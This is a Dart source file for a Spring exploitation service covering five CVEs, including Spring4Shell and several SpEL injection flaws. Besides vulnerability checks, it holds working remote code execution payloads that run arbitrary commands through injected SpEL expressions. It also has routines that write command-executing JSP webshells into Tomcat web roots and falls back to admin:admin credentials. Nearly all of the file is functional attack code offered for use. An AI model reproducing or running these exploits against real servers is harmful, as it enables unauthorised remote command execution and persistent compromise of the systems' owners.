import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:math';

import 'services/exp_result.dart';
import 'services/waf_detect.dart';

enum SpringVulnType {
  springCloudFunction(
    'CVE-2022-22963 (Spring Cloud Function 3.1.6/3.2.2)',
    'Spring Cloud Function SpEL 注入',
  ),
  spring4Shell(
    'CVE-2022-22965 (Spring Framework 5.3.0-5.3.17)',
    'ClassLoader 操控写 Webshell',
  ),
  springDataCommons(
    'CVE-2018-1273 (Spring Data Commons <= 2.0.5)',
    'Spring Data Commons SpEL 注入',
  ),
  springDataRest(
    'CVE-2017-8046 (Spring Data REST 2.6.0-2.6.8)',
    'Spring Data REST PATCH SpEL 注入',
  ),
  springSecurityOauth(
    'CVE-2016-4977 (Spring Security OAuth 2.0.x)',
    'Spring Security OAuth SpEL 注入',
  );

  const SpringVulnType(this.label, this.desc);
  final String label;
  final String desc;
}


class SpringExpService {
  final Uri baseUri;
  final Duration timeout;
  /// Basic Auth 凭据，格式 'user:pass'。
  /// 为空时从 URL userInfo 提取，仍为空则回退 'admin:admin'（仅 CVE-2016-4977 / Spring4Shell 需要）。
  final String credentials;

  SpringExpService({
    required String url,
    this.timeout = const Duration(seconds: 10),
    this.credentials = '',
  }) : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');

  Future<http.StreamedResponse> _sendOauthAuthorize(
    http.Client client, {
    required String responseType,
    String? authHeader,
  }) {
    final url = '${baseUri}oauth/authorize?response_type=${Uri.encodeQueryComponent(responseType)}&client_id=acme&scope=openid&redirect_uri=http://test';
    final req = http.Request('GET', Uri.parse(url))
      ..followRedirects = false
      ..maxRedirects = 0;
    if (authHeader != null) {
      req.headers['Authorization'] = authHeader;
    }
    return client.send(req).timeout(timeout);
  }

  String _buildAuthHeader() {
    if (credentials.isNotEmpty && credentials.contains(':')) {
      return 'Basic ${base64Encode(utf8.encode(credentials))}';
    }
    final userInfo = baseUri.userInfo;
    final creds = userInfo.contains(':') ? userInfo : 'admin:admin';
    return 'Basic ${base64Encode(utf8.encode(creds))}';
  }

  String? _extractUnsupportedResponseType(String text) {
    final m = RegExp(r'Unsupported response types:\s*\[(.*?)\]', dotAll: true).firstMatch(text);
    return m?.group(1)?.trim();
  }

  String _toJavaByteArray(String s) {
    final bytes = utf8.encode(s);
    return bytes.join(',');
  }

  Future<http.Response> _postSpringDataCommonsForm(String body) {
    return http.post(
      Uri.parse('${baseUri}users?page=&size=5'),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': '${baseUri.scheme}://${baseUri.host}${baseUri.hasPort ? ':${baseUri.port}' : ''}',
        'Referer': '${baseUri}users?page=0&size=5',
        // 不要 Accept: text/html —— Spring 会返回 Whitelabel 页面，丢失
        // "Invalid property" 等错误信息；请求 JSON 才能拿到可判定的报文。
        'Accept': 'application/json, text/plain, */*',
      },
      body: body,
    ).timeout(timeout);
  }

  String _buildSpringDataCommonsFormByExpr(String expr) {
    final key = 'username[$expr]';
    return '${Uri.encodeQueryComponent(key)}=&password=&repeatedPassword=';
  }

  String _buildSpringDataCommonsRawFormByExpr(String expr) {
    return 'username[$expr]=&password=&repeatedPassword=';
  }

  // CVE-2022-22963: Spring Cloud Function routing-expression SpEL
  //
  // 注意：漏洞触发时服务端通常返回 **500 + 不含任何 SpEL 关键字的 JSON**，
  // 靠响应体特征判断会漏报（vulhub spring-cloud-function:3.2.2 实测：
  // 靶场可执行 `touch /tmp/pwned`，但响应体只有 generic error）。
  // 因此以 **时间侧信道** 为主：表达式内 `sleep` 会让响应被推迟。
  Future<ExpResult> checkSpringCloudFunction() async {
    const name = 'CVE-2022-22963';
    const sleepSeconds = 3;
    final uri = Uri.parse('${baseUri}functionRouter');
    try {
      // 基线：普通请求，量出正常往返耗时。
      final baseline = Stopwatch()..start();
      await http
          .post(uri, headers: {'Content-Type': 'text/plain'}, body: 'test')
          .timeout(timeout);
      baseline.stop();

      final probe = Stopwatch()..start();
      final detect = await http
          .post(
            uri,
            headers: {
              // 必须 waitFor：Runtime.exec 是非阻塞的，只发 exec 不会拖慢响应。
              'spring.cloud.function.routing-expression':
                  'T(java.lang.Runtime).getRuntime().exec("sleep $sleepSeconds").waitFor()',
              'Content-Type': 'text/plain',
            },
            body: 'test',
          )
          .timeout(timeout);
      probe.stop();

      if (looksLikeWafBlock(detect.statusCode, detect.body)) {
        return ExpResult.probeFailed(
          name,
          '疑似被 WAF 拦截 (HTTP ${detect.statusCode})',
        );
      }
      final deltaMs = probe.elapsedMilliseconds - baseline.elapsedMilliseconds;
      if (deltaMs >= 2000) {
        return ExpResult(
          true,
          name,
          'SpEL 表达式被执行：注入 sleep $sleepSeconds 使响应延迟 ${deltaMs}ms（基线 ${baseline.elapsedMilliseconds}ms）',
        );
      }

      // 兼容部分部署：错误页直接回显 SpEL 类名/表达式。
      final lower = detect.body.toLowerCase();
      final indicators = <String>[
        'spel',
        'org.springframework.expression',
        'spring.cloud.function.routing-expression',
        'routing-expression',
        'routingexpression',
        'evaluationexception',
        'parseexception',
      ];
      if (indicators.any(lower.contains)) {
        return ExpResult(
          true,
          name,
          '响应体含 SpEL 求值特征（状态 ${detect.statusCode}）',
        );
      }

      return ExpResult(
        false,
        name,
        '未观察到延迟侧信道（Δ${deltaMs}ms，HTTP ${detect.statusCode}）',
      );
    } catch (e) {
      return ExpResult.probeFailed(name, '探测失败: $e');
    }
  }

  // CVE-2022-22965 (Spring4Shell): ClassLoader 写 Webshell
  Future<ExpResult> checkSpring4Shell() async {
    try {
      final marker = DateTime.now().millisecondsSinceEpoch.toString();
      final rnd = Random().nextInt(90000) + 10000;
      final shellName = 'm4x_${rnd}.jsp';
      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22m4x%22.equals(request.getParameter(%22k%22)))%7Bout.print(%22$marker%22);%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=m4x_$rnd&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
      await http.get(Uri.parse(writeUrl), headers: {
        'suffix': '%>',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1',
      }).timeout(timeout);
      // Tomcat 的 AccessLogValve 要等下一次请求被记录才真正落盘，且 JSP 首次编译
      // 与文件追加存在竞争；刚启动的实例尤其慢。先发一个无意义请求触发一次日志，
      // 再轮询（最多约 20 秒）。
      await http.get(baseUri).timeout(timeout);
      for (var attempt = 0; attempt < 8; attempt++) {
        await Future<void>.delayed(Duration(seconds: attempt == 0 ? 3 : 2));
        var verify = await http
            .get(Uri.parse('${baseUri}$shellName?k=m4x'))
            .timeout(timeout);
        if (verify.statusCode == 401 || verify.statusCode == 403) {
          verify = await http.get(
            Uri.parse('${baseUri}$shellName?k=m4x'),
            headers: {'Authorization': _buildAuthHeader()},
          ).timeout(timeout);
        }
        if (verify.statusCode == 200 && verify.body.contains(marker)) {
          return ExpResult(
            true,
            'CVE-2022-22965 (Spring4Shell)',
            '可利用：成功写入并回显验证文件 $shellName',
          );
        }
        if (verify.statusCode == 404) continue;
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2022-22965 (Spring4Shell)', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
  }

  // CVE-2018-1273: Spring Data Commons SpEL via username field
  Future<ExpResult> checkSpringDataCommons() async {
    try {
      const expr = '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")';
      final payload = _buildSpringDataCommonsFormByExpr(expr);
      final res = await _postSpringDataCommonsForm(payload);

      final lower = res.body.toLowerCase();
      // 只认强特征：SpEL 求值痕迹，或 Data Commons 绑定失败时暴露的
      // "Invalid property 'username'"（vulhub README 的典型回包）。
      // 旧实现把 "Whitelabel Error Page" / "mappingexception" 也当命中，
      // 任何 Spring 应用的 500 都会误报。
      final spelIndicators = <String>[
        'spel',
        'spelEvalException'.toLowerCase(),
        'el100',
        'org.springframework.expression',
      ];
      final hasSpelFeature = spelIndicators.any(lower.contains);
      final hasProxyBindingError = lower.contains("invalid property 'username'");
      if (hasSpelFeature || hasProxyBindingError) {
        return ExpResult(
          true,
          'CVE-2018-1273',
          hasProxyBindingError
              ? '命中 Data Commons 绑定异常（Invalid property username，HTTP ${res.statusCode}），该漏洞通常为盲打执行'
              : '响应含 SpEL 求值特征（HTTP ${res.statusCode}）',
        );
      }
      final location = res.headers['location'] ?? '';
      final redirectedToLogin = location.toLowerCase().contains('login');
      final contentType = res.headers['content-type'] ?? '';
      final preview = res.body
          .replaceAll(RegExp(r'\s+'), ' ')
          .trim();
      final shortPreview = preview.length > 180
          ? '${preview.substring(0, 180)}...'
          : preview;
      final hint = redirectedToLogin
          ? '响应疑似被认证/登录页拦截（Location: $location）'
          : '未命中 SpEL 特征，可能不是 Spring Data Commons users 端点或版本不受影响';
      return ExpResult(
        false,
        'CVE-2018-1273',
        '$hint（HTTP ${res.statusCode}, Content-Type: $contentType, 片段: $shortPreview）',
      );
    } catch (e) {
      return ExpResult.probeFailed('CVE-2018-1273', '探测失败: $e');
    }
  }

  // CVE-2017-8046: Spring Data REST PATCH SpEL
  Future<ExpResult> checkSpringDataRest() async {
    try {
      Future<http.Response> sendPatch(String payload) {
        return http.patch(
          Uri.parse('${baseUri}customers/1'),
          headers: {'Content-Type': 'application/json-patch+json'},
          body: payload,
        ).timeout(timeout);
      }

      const exploitBody = '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))/lastname", "value": "vulhub" }]';
      final first = await sendPatch(exploitBody);

      bool hasStrongSignal(http.Response res) {
        final text = '${res.body}\n${res.headers['content-type'] ?? ''}'.toLowerCase();
        final words = <String>[
          'spel',
          'spellevaluationexception',
          'org.springframework.expression',
          'el10',
          'unixprocess',
          'processbuilder',
          'could not read an object of type',
          'json-patch',
          'json patch',
        ];
        final hasWord = words.any(text.contains);
        final hasElCode = RegExp(r'EL\d{4}E', caseSensitive: false).hasMatch(res.body);
        return hasWord || hasElCode;
      }

      if (hasStrongSignal(first)) {
        return ExpResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH 返回 SpEL 执行异常特征（状态 ${first.statusCode}）');
      }

      // 备用验证：一些环境不会回显 Runtime 关键字，改用纯数学表达式触发 SpEL 求值异常。
      const fallbackBody = '[{ "op": "replace", "path": "T(java.lang.Math).abs(-54289)/lastname", "value": "vulhub" }]';
      final second = await sendPatch(fallbackBody);
      if (hasStrongSignal(second)) {
        return ExpResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH（备用 payload）返回 SpEL 异常特征（状态 ${second.statusCode}）');
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2017-8046', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2017-8046', '');
  }

  // CVE-2016-4977: Spring Security OAuth SpEL via response_type
  Future<ExpResult> checkSpringSecurityOauth() async {
    try {
      final client = http.Client();
      try {
        Future<ExpResult?> eval(http.StreamedResponse streamed) async {
          final location = streamed.headers['location'] ?? '';
          final body = await streamed.stream.bytesToString();
          if (body.contains('54289') || location.contains('54289') || location.contains(Uri.encodeComponent('54289'))) {
            return ExpResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，233*233=54289 验证通过');
          }
          return null;
        }

        final first = await _sendOauthAuthorize(client, responseType: r'${233*233}');
        final hit1 = await eval(first);
        if (hit1 != null) {
          return hit1;
        }

        if (first.statusCode == 401 || first.statusCode == 403) {
          final second = await _sendOauthAuthorize(
            client,
            responseType: r'${233*233}',
            authHeader: _buildAuthHeader(),
          );
          final hit2 = await eval(second);
          if (hit2 != null) {
            return hit2;
          }
        }
      } finally {
        client.close();
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2016-4977', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2016-4977', '');
  }

  // 执行命令 - CVE-2017-8046
  // 该链路通常是盲打场景：命令副作用可触发，但很难直接在 HTTP 响应中回显 stdout。
  Future<String?> execSpringDataRest(String cmd) async {
    try {
      final bashBytes = _toJavaByteArray('/bin/bash');
      final dashCBytes = _toJavaByteArray('-c');
      final cmdBytes = _toJavaByteArray(cmd);
      final pathExpr =
          'T(java.lang.Runtime).getRuntime().exec(new String[]{'
          'new java.lang.String(new byte[]{$bashBytes}),'
          'new java.lang.String(new byte[]{$dashCBytes}),'
          'new java.lang.String(new byte[]{$cmdBytes})'
          '})/lastname';
      final body = '[{ "op": "replace", "path": "$pathExpr", "value": "vulhub" }]';
      final res = await http.patch(
        Uri.parse('${baseUri}customers/1'),
        headers: {'Content-Type': 'application/json-patch+json'},
        body: body,
      ).timeout(timeout);
      final text = res.body.toLowerCase();
      final hasSignal = text.contains('spel') ||
          text.contains('org.springframework.expression') ||
          RegExp(r'EL\d{4}E', caseSensitive: false).hasMatch(res.body);
      if (hasSignal) {
        return '8046 payload 已触发（HTTP ${res.statusCode}）。该漏洞通常无直接命令回显，请通过副作用验证（如文件落地/出网）。';
      }
      return '8046 请求已发送（HTTP ${res.statusCode}），未发现明显回显特征。';
    } catch (e) {
      return '8046 执行请求异常: $e';
    }
  }

  Future<ExpResult> checkSingle(SpringVulnType type) async {
    switch (type) {
      case SpringVulnType.springCloudFunction: return checkSpringCloudFunction();
      case SpringVulnType.spring4Shell: return checkSpring4Shell();
      case SpringVulnType.springDataCommons: return checkSpringDataCommons();
      case SpringVulnType.springDataRest: return checkSpringDataRest();
      case SpringVulnType.springSecurityOauth: return checkSpringSecurityOauth();
    }
  }

  // 执行命令 - CVE-2016-4977（优先直接回显 stdout，失败时降级到退出码/首字节）
  Future<String?> execSpringSecurityOauth(String cmd) async {
    try {
      final client = http.Client();
      try {
        final parts = cmd.trim().split(RegExp(r'\s+')).where((e) => e.isNotEmpty).toList();
        if (parts.isEmpty) return null;
        final argvCsv = parts
            .map((p) => p.replaceAll('\\', '\\\\').replaceAll('"', '\\"'))
            .join(',');
        final execExpr =
            r'T(java.lang.Runtime).getRuntime().exec("' + argvCsv + r'".split(","))';
        final outputPayload =
            r'${T(org.springframework.util.StreamUtils).copyToString(' +
                execExpr +
                r'.getInputStream(),T(java.nio.charset.StandardCharsets).UTF_8)}';
        final errorPayload =
            r'${T(org.springframework.util.StreamUtils).copyToString(' +
                execExpr +
                r'.getErrorStream(),T(java.nio.charset.StandardCharsets).UTF_8)}';
        final exitPayload =
            r'${' + execExpr + r'.waitFor()}';
        final firstBytePayload =
            r'${' + execExpr + r'.getInputStream().read()}';

        Future<String?> runOnce({String? authHeader}) async {
          final outResp = await _sendOauthAuthorize(
            client,
            responseType: outputPayload,
            authHeader: authHeader,
          );
          final outBody = await outResp.stream.bytesToString();
          final outMsg = _extractUnsupportedResponseType(outBody);
          if (outMsg != null && outMsg.isNotEmpty && !outMsg.contains(r'${')) {
            return outMsg;
          }

          final errResp = await _sendOauthAuthorize(
            client,
            responseType: errorPayload,
            authHeader: authHeader,
          );
          final errBody = await errResp.stream.bytesToString();
          final errMsg = _extractUnsupportedResponseType(errBody);
          if (errMsg != null && errMsg.isNotEmpty && !errMsg.contains(r'${')) {
            return 'stderr:\n$errMsg';
          }

          final runResp = await _sendOauthAuthorize(
            client,
            responseType: exitPayload,
            authHeader: authHeader,
          );
          final runBody = await runResp.stream.bytesToString();
          final runMsg = _extractUnsupportedResponseType(runBody);
          if (runMsg == null || runMsg.contains(r'${')) return null;

          final byteResp = await _sendOauthAuthorize(
            client,
            responseType: firstBytePayload,
            authHeader: authHeader,
          );
          final byteBody = await byteResp.stream.bytesToString();
          final byteMsg = _extractUnsupportedResponseType(byteBody);
          if (byteMsg == null || byteMsg.isEmpty || byteMsg.contains(r'${')) {
            return 'exit_code=$runMsg';
          }
          final v = int.tryParse(byteMsg.trim());
          if (v == null || v < 0 || v > 255) {
            return 'exit_code=$runMsg\nstdout_first_byte=$byteMsg';
          }
          final ch = String.fromCharCode(v);
          return 'exit_code=$runMsg\nstdout_first_byte=$v ($ch)';
        }

        final first = await runOnce();
        if (first != null && first.isNotEmpty) {
          return first;
        }
        final second = await runOnce(authHeader: _buildAuthHeader());
        return (second != null && second.isNotEmpty) ? second : null;
      } finally {
        client.close();
      }
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - CVE-2022-22963
  Future<String?> execSpringCloudFunction(String cmd) async {
    try {
      // SpEL 的双引号字符串不支持 `\"` 转义（实测会原样保留反斜杠），
      // 因此把命令 Base64 后传进去，用 T(java.util.Base64) 在目标端解码。
      final b64Cmd = base64.encode(utf8.encode(cmd));
      final spel2 =
          'new java.util.Scanner(T(java.lang.Runtime).getRuntime()'
          '.exec(new String[]{"/bin/bash","-c",'
          'new String(T(java.util.Base64).getDecoder().decode("$b64Cmd"))})'
          '.getInputStream()).useDelimiter("\\\\A").next()';
      final res = await http.post(
        Uri.parse('${baseUri}functionRouter'),
        headers: {
          'spring.cloud.function.routing-expression': spel2,
          'Content-Type': 'text/plain',
        },
        body: 'test',
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - CVE-2018-1273
  // 两步：写文件 + exec。
  // URL-safe Base64 去掉 padding，规避 + / = 在 application/x-www-form-urlencoded 表单 key 中被截断。
  // 表达式不含 []，规避 username[<expr>] 字段名被内层 ] 截断。
  Future<String?> execSpringDataCommons(String cmd) async {
    try {
      final b64 = base64Url.encode(utf8.encode(cmd)).replaceAll('=', '');
      final writeExpr =
          '#this.getClass().forName("java.nio.file.Files").write('
          '#this.getClass().forName("java.nio.file.Paths").get("/tmp/.mx.sh"),'
          '#this.getClass().forName("java.util.Base64").getUrlDecoder().decode("$b64")'
          ')';
      final execExpr =
          '#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/.mx.sh")';
      final writeRes = await _postSpringDataCommonsForm(
        _buildSpringDataCommonsRawFormByExpr(writeExpr),
      );
      final execRes = await _postSpringDataCommonsForm(
        _buildSpringDataCommonsRawFormByExpr(execExpr),
      );
      return '2018-1273 payload 已发送（write=${writeRes.statusCode}, exec=${execRes.statusCode}）。请验证回连。';
    } catch (_) {
      return null;
    }
  }

  // Spring4Shell: 写入 Webshell 再执行
  Future<String?> execSpring4Shell(String cmd) async {
    try {
      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
      await http.get(Uri.parse(writeUrl), headers: {
        'suffix': '%>',
        'c1': 'Runtime',
        'c2': '<%',
      }).timeout(timeout);
      await Future.delayed(const Duration(seconds: 1));
      final execUrl = '${baseUri}tomcatwar.jsp?pwd=j&cmd=${Uri.encodeComponent(cmd)}';
      final res = await http.get(Uri.parse(execUrl)).timeout(timeout);
      if (res.statusCode == 200 && res.body.isNotEmpty) {
        return res.body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(SpringVulnType type, String cmd) async {
    switch (type) {
      case SpringVulnType.springCloudFunction: return execSpringCloudFunction(cmd);
      case SpringVulnType.spring4Shell: return execSpring4Shell(cmd);
      case SpringVulnType.springDataCommons: return execSpringDataCommons(cmd);
      case SpringVulnType.springDataRest: return execSpringDataRest(cmd);
      case SpringVulnType.springSecurityOauth: return execSpringSecurityOauth(cmd);
    }
  }

  Future<String?> _verifyShell(String shellName) async {
    try {
      var res = await http.get(Uri.parse('${baseUri}$shellName')).timeout(timeout);
      if (res.statusCode == 401 || res.statusCode == 403) {
        res = await http.get(
          Uri.parse('${baseUri}$shellName'),
          headers: {'Authorization': _buildAuthHeader()},
        ).timeout(timeout);
      }
      if (res.statusCode == 200) {
        return '${baseUri}$shellName';
      }
    } catch (_) {}
    return null;
  }

  Future<String?> _writeByCommandChannel(
    Future<String?> Function(String cmd) execCmd,
    String shellContent, {
    void Function(String line)? onLog,
  }) async {
    final shellName = 'mAtrix_s_${Random().nextInt(90000) + 10000}.jsp';
    final b64 = base64Encode(utf8.encode(shellContent));
    final paths = <String>[
      '/usr/local/tomcat/webapps/ROOT/$shellName',
      '/opt/tomcat/webapps/ROOT/$shellName',
      '/var/lib/tomcat9/webapps/ROOT/$shellName',
      '/var/lib/tomcat/webapps/ROOT/$shellName',
    ];
    for (final p in paths) {
      onLog?.call('[*] 尝试写入: $p');
      final cmd = "echo '$b64' | base64 -d > $p && chmod 644 $p";
      await execCmd(cmd);
      await Future.delayed(const Duration(milliseconds: 400));
      final hit = await _verifyShell(shellName);
      if (hit != null) {
        onLog?.call('[+] Webshell 写入成功: $hit');
        return hit;
      }
    }
    return null;
  }

  Future<String?> _getShellBySpring4Shell(
    String shellContent, {
    void Function(String line)? onLog,
  }) async {
    try {
      final shellName = 'mAtrix_s_${Random().nextInt(90000) + 10000}';
      final encodedBody = Uri.encodeComponent(shellContent);
      final writeUrl =
          '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=$encodedBody'
          '&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'
          '&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT'
          '&class.module.classLoader.resources.context.parent.pipeline.first.prefix=$shellName'
          '&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
      await http.get(Uri.parse(writeUrl), headers: {
        'suffix': '',
        'c1': 'Runtime',
        'c2': '',
      }).timeout(timeout);
      await Future.delayed(const Duration(seconds: 1));
      return _verifyShell('$shellName.jsp');
    } catch (e) {
      onLog?.call('[!] Spring4Shell 写入异常: $e');
      return null;
    }
  }

  Future<String?> _getShellByOauth(
    String shellContent, {
    void Function(String line)? onLog,
  }) async {
    final shellName = 'mAtrix_s_${Random().nextInt(90000) + 10000}.jsp';
    final b64 = base64Encode(utf8.encode(shellContent));
    final paths = <String>[
      '/usr/local/tomcat/webapps/ROOT/$shellName',
      '/opt/tomcat/webapps/ROOT/$shellName',
      '/var/lib/tomcat9/webapps/ROOT/$shellName',
      '/var/lib/tomcat/webapps/ROOT/$shellName',
    ];
    final client = http.Client();
    try {
      for (final p in paths) {
        onLog?.call('[*] OAuth 通道尝试写入: $p');
        final expr =
            r'${T(java.nio.file.Files).write(T(java.nio.file.Paths).get("' +
            p +
            r'"),T(java.util.Base64).getDecoder().decode("' +
            b64 +
            r'"))}';
        var resp = await _sendOauthAuthorize(client, responseType: expr);
        if (resp.statusCode == 401 || resp.statusCode == 403) {
          resp = await _sendOauthAuthorize(
            client,
            responseType: expr,
            authHeader: _buildAuthHeader(),
          );
        }
        await resp.stream.drain();
        await Future.delayed(const Duration(milliseconds: 400));
        final hit = await _verifyShell(shellName);
        if (hit != null) {
          onLog?.call('[+] Webshell 写入成功: $hit');
          return hit;
        }
      }
      return null;
    } catch (e) {
      onLog?.call('[!] OAuth 写入异常: $e');
      return null;
    } finally {
      client.close();
    }
  }

  Future<String?> getShell(
    SpringVulnType type,
    String shellContent, {
    void Function(String line)? onLog,
  }) async {
    onLog?.call('[*] GetShell (${type.label})...');
    switch (type) {
      case SpringVulnType.springCloudFunction:
        return _writeByCommandChannel(
          execSpringCloudFunction,
          shellContent,
          onLog: onLog,
        );
      case SpringVulnType.spring4Shell:
        return _getShellBySpring4Shell(shellContent, onLog: onLog);
      case SpringVulnType.springDataCommons:
        return _writeByCommandChannel(
          execSpringDataCommons,
          shellContent,
          onLog: onLog,
        );
      case SpringVulnType.springDataRest:
        return _writeByCommandChannel(
          execSpringDataRest,
          shellContent,
          onLog: onLog,
        );
      case SpringVulnType.springSecurityOauth:
        return _getShellByOauth(shellContent, onLog: onLog);
    }
  }
}
